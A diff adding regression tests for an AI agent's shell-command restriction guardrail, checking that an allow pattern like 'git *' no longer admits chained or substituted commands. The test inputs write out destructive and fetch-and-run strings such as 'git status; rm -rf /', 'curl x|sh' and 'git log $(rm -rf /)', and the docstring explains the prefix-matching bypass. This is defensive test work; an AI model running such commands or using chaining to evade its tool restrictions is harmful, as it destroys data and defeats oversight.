@@ -818,3 +818,129 @@ class TestPatternGuardrailIntegration:
         mock_context.tool_name = "another_tool"
         result = skill_tool_restriction_guardrail(data)
         assert result.behavior["type"] == "allow"
+
+
+class TestShellPatternChainingBypass:
+    """Regression tests for the command-chaining restriction bypass (S2).
+
+    ``fnmatch(command, "git *")`` matched ``git status; rm -rf /`` because the
+    whole string still starts with ``git ``. The matcher now splits on shell
+    operators and requires EVERY segment to match, and rejects command/process
+    substitution outright.
+    """
+
+    def test_semicolon_chaining_is_rejected(self):
+        import json
+
+        restrictions = SkillRestrictions(
+            loaded_skills=["git-skill"],
+            allowed_tools={"run_shell:git *"},
+        )
+
+        args = json.dumps({"command": "git status; rm -rf /"})
+        assert restrictions.is_tool_allowed("run_shell", args) is False
+
+    def test_and_chaining_with_pipe_to_interpreter_is_rejected(self):
+        import json
+
+        restrictions = SkillRestrictions(
+            loaded_skills=["git-skill"],
+            allowed_tools={"run_shell:git *"},
+        )
+
+        args = json.dumps({"command": "git log && curl x|sh"})
+        assert restrictions.is_tool_allowed("run_shell", args) is False
+
+    def test_pipe_to_shell_is_rejected(self):
+        import json
+
+        restrictions = SkillRestrictions(
+            loaded_skills=["git-skill"],
+            allowed_tools={"run_shell:git *"},
+        )
+
+        args = json.dumps({"command": "git diff | sh"})
+        assert restrictions.is_tool_allowed("run_shell", args) is False
+
+    def test_or_chaining_is_rejected(self):
+        import json
+
+        restrictions = SkillRestrictions(
+            loaded_skills=["git-skill"],
+            allowed_tools={"run_shell:git *"},
+        )
+
+        args = json.dumps({"command": "git status || rm -rf ~"})
+        assert restrictions.is_tool_allowed("run_shell", args) is False
+
+    def test_command_substitution_is_rejected(self):
+        import json
+
+        restrictions = SkillRestrictions(
+            loaded_skills=["git-skill"],
+            allowed_tools={"run_shell:git *"},
+        )
+
+        # Substitution smuggles an arbitrary command inside an otherwise
+        # git-shaped line; a first-token pattern cannot police it.
+        assert (
+            restrictions.is_tool_allowed(
+                "run_shell", json.dumps({"command": "git log $(rm -rf /)"})
+            )
+            is False
+        )
+        assert (
+            restrictions.is_tool_allowed("run_shell", json.dumps({"command": "git log `rm -rf /`"}))
+            is False
+        )
+
+    def test_plain_command_still_allowed(self):
+        import json
+
+        restrictions = SkillRestrictions(
+            loaded_skills=["git-skill"],
+            allowed_tools={"run_shell:git *"},
+        )
+
+        assert (
+            restrictions.is_tool_allowed("run_shell", json.dumps({"command": "git status"})) is True
+        )
+        assert (
+            restrictions.is_tool_allowed(
+                "run_shell", json.dumps({"command": "git commit -m 'test'"})
+            )
+            is True
+        )
+
+    def test_quoted_operator_is_not_a_separator(self):
+        import json
+
+        # A pipe inside a quoted grep pattern must NOT be treated as a chain.
+        restrictions = SkillRestrictions(
+            loaded_skills=["grep-skill"],
+            allowed_tools={"run_shell:grep *"},
+        )
+
+        args = json.dumps({"command": "grep 'a|b' file.txt"})
+        assert restrictions.is_tool_allowed("run_shell", args) is True
+
+    def test_git_command_chaining_is_rejected(self):
+        import json
+
+        restrictions = SkillRestrictions(
+            loaded_skills=["git-readonly"],
+            allowed_tools={"git_command:status*"},
+        )
+
+        # Plain read-only still works.
+        assert restrictions.is_tool_allowed("git_command", json.dumps({"args": "status"})) is True
+
+        # Chained / substituted git args are rejected.
+        assert (
+            restrictions.is_tool_allowed("git_command", json.dumps({"args": "status; rm -rf /"}))
+            is False
+        )
+        assert (
+            restrictions.is_tool_allowed("git_command", json.dumps({"args": "status $(rm -rf /)"}))
+            is False
+        )
